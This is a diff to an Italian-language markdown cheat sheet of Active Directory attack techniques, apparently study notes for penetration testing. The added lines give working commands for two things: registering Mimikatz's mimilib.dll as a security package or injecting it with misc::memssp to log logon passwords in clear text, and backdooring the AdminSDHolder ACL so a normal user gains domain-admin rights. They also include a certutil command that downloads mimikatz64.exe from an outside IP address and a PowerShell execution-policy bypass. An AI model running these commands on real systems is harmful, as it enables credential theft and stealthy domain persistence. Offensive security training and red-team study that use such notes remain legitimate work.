@@ -271,6 +271,36 @@ o
 ### La SSP è una DLL la quale fornisce una via per un applicazione di ottenere una comunicazione autenticata. Alcune SSP di Microsoft sono NTLM,Kerberos,WDigest. L'SSPI si occuperà di trovare il protocollo adeguato per due macchine che vogliono comunicare. Il metodo preferito è Kerberos. Questi protocolli di autenticazione sono chiamati Security Support Provider (SSP), si trovano all'interno di ogni macchina Windows sotto forma di DLL ed entrambi i computer devono supportarli per poter comunicare. Mimikatz fornisce una SSP personalizzata chiamata (mimilib.dll). Questo SSP registra i logon locali, account di servizio e le password degli account macchina in testo chiaro sul server di destinazione.
 ## Prerequisiti: Local Admin nella macchina
 ```
-
+			Drop the mimilib.dll to system32 and add mimilib to
+			- $packages Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' select -ExpandProperty 'Security Packages'
+			- $packages += "mimilib"
+			- Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
+			- Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
+			
+			Using Invoke-Mimikatz
+			- powershell -ep bypass
+			- Import-Module Invoke-Mimikatz.ps1
+			- Invoke-Mimikatz -Command '"misc::memssp"'
+			- Tutte le info recuperate sono su C:\Windows\system32\kiwissp.log
 	
+```
+```
+			Drop the mimilib.dll to system32 and add mimilib to
+			- $packages Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' select -ExpandProperty 'Security Packages'
+			- $packages += "mimilib"
+			- Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages
+			- Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
+			
+			Using mimikatz
+			- certutil.exe -urlcache -f "http://192.168.119.206/mimikatz64.exe" mimikatz.exe
+			- mimikatz.exe '"misc::memssp"' (inieittare mimilib dentro lsass -> non stabile per Server 2016)
+			- Tutte le info recuperate sono su C:\Windows\system32\kiwissp.log
+```
+
+## AdminSDHolder (Privilegi Domain Admins sull'oggetto AdminSDHolder)
+### AdminSDHolder è un container e viene utilizzato per controllare le autorizzazioni permessi utilizzando una ACL per alcuni gruppi privilegiati incorporati ( chiamati gruppi protetti come Domain Admins,Backup Operators,Server Operators..).L'ACL può essere visualizzato sull'oggetto AdminSDHolder stesso. Utenti e computer -> System -> AdminSDHolder e selezionare Proprietà. Security Descriptor Propagator (SDPROP) viene eseguito ogni ora e confronta l'ACL dei gruppi e dei membri protetti con l'ACL di AdminSDHolder e le eventuali differenze vengono sovrascritte nell'ACL dell'oggetto.
+```
+			- Add-ObjectAcl -TargetADSprefix 'CN=AdminSDHolder, CN=System' -PrincipalSamAccountName claudionepc -Rights -All -Verbose (Aggiundere da account nel DA pieno controllo ad un utente normale claudionepc al AdminSDHolder)
+			- Set-ADACL -DistinguishedName 'CN=AdminSDHolder, CN=System, DC=dollarcorp, DC=nomeycorp,DC=local' -Principal claudionepc -Verbose (Usare modulo ActiveDrectory)
+			- Invoke-SDPropagator -timeoutMinutes 1 -showProgress
 ```
